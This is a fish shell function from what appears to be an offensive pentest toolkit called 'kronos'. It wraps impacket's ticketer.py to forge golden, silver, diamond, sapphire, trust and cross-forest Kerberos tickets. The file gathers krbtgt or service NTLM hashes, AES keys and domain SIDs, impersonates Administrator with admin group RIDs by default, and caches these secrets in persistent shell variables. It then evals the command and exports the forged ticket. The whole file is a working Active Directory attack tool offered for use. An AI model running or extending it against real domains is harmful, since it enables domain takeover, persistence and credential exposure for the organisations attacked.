# description: Create Golden, Silver, Diamond, Sapphire, Trust, and Cross-Forest Tickets
function __kronos_ticket --description "Create advanced AD tickets using ticketer.py"
    set -l ticket_types golden silver diamond sapphire trust cross-forest
    
    # Run argparse FIRST so we know if -q is set
    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= I/user-id= G/groups= A/auth-user= P/auth-pass= L/auth-hash= K/aes-key= E/extra-sid= q/quiet X/edit-cmd -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [subcommand] [OPTIONS]"
        echo ""
        echo "Create advanced AD tickets using impacket's ticketer.py."
        echo ""
        echo "Options:"
        echo "  -q, --quiet          Skip prompts and use cached/default values"
        echo "  -X, --edit-cmd       Inspect and edit the command before execution"
        echo "  -h, --help           Show this help message"
        return 0
    end

    set -l subaction $argv[1]
    set -l wizard 0
    
    if test -z "$subaction"
        if not set -q _flag_quiet
            set subaction (__kronos_ask_choice "Pick a ticket type to forge" "golden" $ticket_types); or return 1
            set wizard 1
        else
            echo "error: subcommand required in quiet mode (e.g. kronos ticket golden -q)" >&2
            return 1
        end
    else if contains -- "$subaction" $ticket_types
        if not set -q _flag_quiet
            set wizard 1
        end
        # Only remove if it was explicitly passed as an argument
        if test (count $argv) -gt 0; and test "$argv[1]" = "$subaction"
            set -e argv[1]
        end
    end

    # Capture flags
    set -l domain $_flag_domain
    set -l user $_flag_user
    set -l sid $_flag_sid
    set -l hash $_flag_hash
    set -l spn $_flag_spn
    set -l user_id $_flag_user_id
    set -l groups $_flag_groups
    set -l auth_user $_flag_auth_user
    set -l auth_pass $_flag_auth_pass
    set -l auth_hash $_flag_auth_hash
    set -l aes_key $_flag_aes_key
    set -l extra_sid $_flag_extra_sid

    if test "$wizard" -eq 1
        set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
        
        # 1. krbtgt/service NTLM Hash
        set -l hash_label "Target NTLM Hash"
        switch "$subaction"
            case golden cross-forest diamond sapphire; set hash_label "krbtgt NTLM Hash"
            case silver; set hash_label "Service NTLM Hash"
            case trust; set hash_label "Trust Account NTLM Hash"
        end
        set -l def_hash "$__KRONOS_CACHE_HASH"
        if test -z "$def_hash"; set def_hash "$TGT_PASSWORD"; end
        if test -z "$def_hash"; set def_hash "$TGT_CRED_PASSWORD"; end
        if test -n "$hash"; set def_hash "$hash"; end
        set hash (__kronos_ask "$hash_label" "$def_hash"); or return 1
        set -U __KRONOS_CACHE_HASH "$hash"

        # 2. krbtgt AES256 Key (Golden, Diamond, Sapphire, Cross-Forest)
        if contains -- "$subaction" golden diamond sapphire cross-forest
            set -l def_aes "$__KRONOS_CACHE_AES_KEY"
            if test -n "$aes_key"; set def_aes "$aes_key"; end
            set aes_key (__kronos_ask "krbtgt AES256 Key" "$def_aes")
            set -U __KRONOS_CACHE_AES_KEY "$aes_key"
        end

        # 3. Domain SID
        set -l def_sid "$__KRONOS_CACHE_SID"
        if test -n "$sid"; set def_sid "$sid"; end
        set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
        set -U __KRONOS_CACHE_SID "$sid"

        # 4. Domain Name
        set -l def_domain "$__KRONOS_CACHE_DOMAIN"
        if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
        if test -n "$domain"; set def_domain "$domain"; end
        set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
        set -U __KRONOS_CACHE_DOMAIN "$domain"

        # 5. User to Impersonate
        set -l user_prompt "User to Impersonate"
        if test "$subaction" = "sapphire"; set user_prompt "User to Impersonate (via S4U2Self)"; end
        set -l def_user "$__KRONOS_CACHE_USER"
        if test -z "$def_user"; set def_user "Administrator"; end
        if test -n "$user"; set def_user "$user"; end
        set user (__kronos_ask "$user_prompt" "$def_user"); or return 1
        set -U __KRONOS_CACHE_USER "$user"

        # 6. Extra SID (Cross-Forest)
        if test "$subaction" = "cross-forest"
            set -l def_extra "$__KRONOS_CACHE_EXTRA_SID"
            if test -n "$extra_sid"; set def_extra "$extra_sid"; end
            set extra_sid (__kronos_ask "Extra SID" "$def_extra"); or return 1
            set -U __KRONOS_CACHE_EXTRA_SID "$extra_sid"
        end
        
        # 7. Low-Priv Auth User & Pass/Hash (Diamond/Sapphire)
        if test "$subaction" = "diamond" -o "$subaction" = "sapphire"
            set -l def_auth_user "$__KRONOS_CACHE_AUTH_USER"
            if test -z "$def_auth_user"; set def_auth_user "$TGT_USERNAME"; end
            if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; end
            if test -n "$auth_user"; set def_auth_user "$auth_user"; end
            set auth_user (__kronos_ask "Low-priv Auth Username" "$def_auth_user"); or return 1
            set -U __KRONOS_CACHE_AUTH_USER "$auth_user"

            set -l def_auth_val "$__KRONOS_CACHE_AUTH_VAL"
            if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; end
            if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; end
            if test -n "$auth_pass"; set def_auth_val "$auth_pass"; end
            if test -n "$auth_hash"; set def_auth_val "$auth_hash"; end
            set -l auth_input (__kronos_ask "Low-priv Auth Password or Hash" "$def_auth_val"); or return 1
            set -U __KRONOS_CACHE_AUTH_VAL "$auth_input"
            
            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                set auth_hash "$auth_input"; set auth_pass ""
            else
                set auth_pass "$auth_input"; set auth_hash ""
            end

            # 8. User ID (RID)
            set -l rid_label "Target User RID"
            set -l def_user_id "$__KRONOS_CACHE_USER_ID"
            if test -z "$def_user_id"; set def_user_id "500"; end # Default admin for Diamond
            
            if test "$subaction" = "sapphire"
                set rid_label "Low-priv User RID"
                set def_user_id "$__KRONOS_CACHE_LOWPRIV_RID"
            end
            
            if test -n "$user_id"; set def_user_id "$user_id"; end
            set user_id (__kronos_ask "$rid_label" "$def_user_id"); or return 1
            
            if test "$subaction" = "sapphire"
                set -U __KRONOS_CACHE_LOWPRIV_RID "$user_id"
            else
                set -U __KRONOS_CACHE_USER_ID "$user_id"
            end

            # 9. Groups (Diamond)
            if test "$subaction" = "diamond"
                set -l def_groups "$__KRONOS_CACHE_GROUPS"
                if test -z "$def_groups"; set def_groups "512,513,518,519,520"; end
                if test -n "$groups"; set def_groups "$groups"; end
                set groups (__kronos_ask "Group RIDs (comma-separated)" "$def_groups"); or return 1
                set -U __KRONOS_CACHE_GROUPS "$groups"
            end
        end

        # 10. SPN (Silver/Trust)
        if test "$subaction" = "silver" -o "$subaction" = "trust"
            set -l def_spn "$__KRONOS_CACHE_SPN"
            if test "$subaction" = "trust" -a -z "$def_spn"
                set def_spn "krbtgt/PARENT.DOMAIN"
            end
            if test -n "$spn"; set def_spn "$spn"; end
            set spn (__kronos_ask "Target SPN" "$def_spn"); or return 1
            set -U __KRONOS_CACHE_SPN "$spn"
        end
    else
        # Standard Fallbacks
        if test -z "$domain"; set domain "$__KRONOS_CACHE_DOMAIN"; end
        if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
        if test -z "$sid"; set sid "$__KRONOS_CACHE_SID"; end
        if test -z "$hash"; set hash "$__KRONOS_CACHE_HASH"; end
        if test -z "$hash"; set hash $TGT_PASSWORD; end
        if test -z "$hash"; set hash $TGT_CRED_PASSWORD; end
        if test -z "$user"; set user "$__KRONOS_CACHE_USER"; end
        if test -z "$user"; set user "Administrator"; end
        if test -z "$aes_key"; set aes_key "$__KRONOS_CACHE_AES_KEY"; end
        if test "$subaction" = "cross-forest"; and test -z "$extra_sid"; set extra_sid "$__KRONOS_CACHE_EXTRA_SID"; end
        if contains -- "$subaction" silver trust; and test -z "$spn"; set spn "$__KRONOS_CACHE_SPN"; end
        if contains -- "$subaction" diamond sapphire
            if test -z "$auth_user"; set auth_user "$__KRONOS_CACHE_AUTH_USER"; end
            if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
            if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end

            if test -z "$auth_pass"; and test -z "$auth_hash"
                set -l cached_auth "$__KRONOS_CACHE_AUTH_VAL"
                if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$cached_auth"
                    set auth_hash "$cached_auth"
                else
                    set auth_pass "$cached_auth"
                end
            end
            if test -z "$auth_pass"; and test -z "$auth_hash"; set auth_pass $TGT_PASSWORD; end
            if test -z "$auth_pass"; and test -z "$auth_hash"; set auth_pass $TGT_CRED_PASSWORD; end

            if test -z "$user_id"
                if test "$subaction" = "sapphire"
                    set user_id "$__KRONOS_CACHE_LOWPRIV_RID"
                else
                    set user_id "$__KRONOS_CACHE_USER_ID"
                    if test -z "$user_id"; set user_id "500"; end
                end
            end

            if test "$subaction" = "diamond" -a -z "$groups"; set groups "$__KRONOS_CACHE_GROUPS"; end
            if test "$subaction" = "diamond" -a -z "$groups"; set groups "512,513,518,519,520"; end
        end
    end

    # Validation
    if test -z "$domain"; echo "error: domain is required"; return 1; end
    if test -z "$sid"; echo "error: domain SID is required"; return 1; end
    if test -z "$hash"; echo "error: hash is required"; return 1; end
    if test "$subaction" = "cross-forest" -a -z "$extra_sid"; echo "error: extra-sid is required"; return 1; end
    if contains -- "$subaction" silver trust; and test -z "$spn"; echo "error: spn is required"; return 1; end
    if contains -- "$subaction" diamond sapphire
        if test -z "$auth_user"; echo "error: auth-user is required"; return 1; end
        if test -z "$auth_pass" -a -z "$auth_hash"; echo "error: auth password or hash is required"; return 1; end
    end

    set -l impacket_cmd ""
    if command -v ticketer.py >/dev/null; set impacket_cmd ticketer.py
    else if command -v impacket-ticketer >/dev/null; set impacket_cmd impacket-ticketer
    else; echo "error: ticketer not found."; return 1; end

    set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
    if test -n "$aes_key"; set -a ticket_args -aesKey "$aes_key"; end
    
    if test -n "$TGT_DC_IP"
        set -a ticket_args -dc-ip "$TGT_DC_IP"
    else if test -n "$TGT_DC"
        set -a ticket_args -dc-ip "$TGT_DC"
    end

    set -l final_user "$user"

    switch "$subaction"
        case silver trust
            set -a ticket_args -spn "$spn"
            echo "[*] Forging $subaction Ticket for $user..."
        case diamond
            set -a ticket_args -request -user "$domain/$auth_user" -user-id "$user_id" -groups "$groups"
            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
            else; set -a ticket_args -password "$auth_pass"; end
            echo "[*] Forging Diamond Ticket for $user..."
        case sapphire
            set -a ticket_args -request -user "$auth_user" -user-id "$user_id" -impersonate "$user"
            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
            else; set -a ticket_args -password "$auth_pass"; end
            set final_user "baduser"
            echo "[*] Forging Sapphire Ticket for $user (stored in $final_user.ccache)..."
        case cross-forest
            set -a ticket_args -extra-sid "$extra_sid"
            echo "[*] Forging Cross-Forest Golden Ticket for $user..."
        case golden '*'
            echo "[*] Forging Golden Ticket for $user..."
    end
    
    set -a ticket_args "$final_user"

    set -l full_cmd "$impacket_cmd "(string join ' ' -- $ticket_args)
    if set -q _flag_edit_cmd
        set full_cmd (__kronos_edit_cmd "$full_cmd"); or return 1
    end

    __kronos_check_dep $impacket_cmd; or return 1
    echo "[*] Forging ticket via $impacket_cmd..."
    eval $full_cmd
    
    if test -f "$final_user.ccache"
        set -gx KRB5CCNAME "$PWD/$final_user.ccache"
        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
    end
end
